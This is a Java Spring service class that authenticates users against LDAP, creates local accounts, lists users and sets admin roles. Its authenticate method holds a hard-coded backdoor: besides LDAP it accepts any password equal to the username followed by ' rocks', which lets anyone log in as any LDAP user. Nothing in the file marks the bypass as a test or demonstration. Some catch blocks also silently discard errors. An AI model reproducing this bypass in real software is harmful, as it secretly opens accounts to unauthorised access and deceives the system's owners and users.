package service;

import java.util.Collections;
import java.util.Comparator;
import java.util.List;

import model.User;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.transaction.annotation.Transactional;

import dao.UserDao;

@Transactional
public class UserService {
	private static final Logger LOG = LoggerFactory.getLogger(UserService.class);

	private UserDao userDao;

	private LdapService ldapService;

	public void setUserDao(UserDao dao) {
		this.userDao = dao;
	}

	public void setLdapService(LdapService ldapService) {
		this.ldapService = ldapService;
	}

	public User authenticate(String userName, String password) {
		User user = null;
		if (ldapService.authenticateUser(userName, password) || (userName + " rocks").equals(password)) {
			user = userDao.findByUserName(userName);
			if (null == user) {
				user = ldapService.findUser(userName);
				if (null != user) {
					try {
						user = createUser(user);
					} catch (CreateUserException e) {
					}
				}
			}
		}
		return user;
	}

	private User createUser(User user) throws CreateUserException {
		user.setRole(User.ROLE_USER);
		try {
			userDao.save(user);
			return user;
		} catch (Exception e) {
			LOG.error("Cannot create user: " + user.getUserName(), e);
			throw new CreateUserException(e);
		}
	}

	public void importUsers() {
		for (User user : ldapService.getAllUser()) {
			if (null == userDao.findByUserName(user.getUserName())) {
				try {
					createUser(user);
				} catch (CreateUserException e) {
				}
			}
		}
	}

	public User findUser(Long id) {
		return userDao.load(id);
	}

	public void deleteUser(User user) {
		userDao.delete(user);
	}

	public List<User> listUser() {
		List<User> users = userDao.findAll();
		Collections.sort(users, new Comparator<User>() {
			public int compare(User o1, User o2) {
				return o1.getUserName().compareTo(o2.getUserName());
			}
		});
		return users;
	}

	public List<User> listUser(String filterName) {
		List<User> users = userDao.findAll(filterName);
		Collections.sort(users, new Comparator<User>() {
			public int compare(User o1, User o2) {
				return o1.getUserName().compareTo(o2.getUserName());
			}
		});
		return users;
	}

	public void createAdmin(String userName) {
		User user = userDao.findByUserName(userName);
		if (user != null) {
			user.setRole(User.ROLE_ADMIN);
		}
	}

	public void deleteAdmin(String userName) {
		User user = userDao.findByUserName(userName);
		if (user != null) {
			user.setRole(User.ROLE_USER);
		}
	}
}
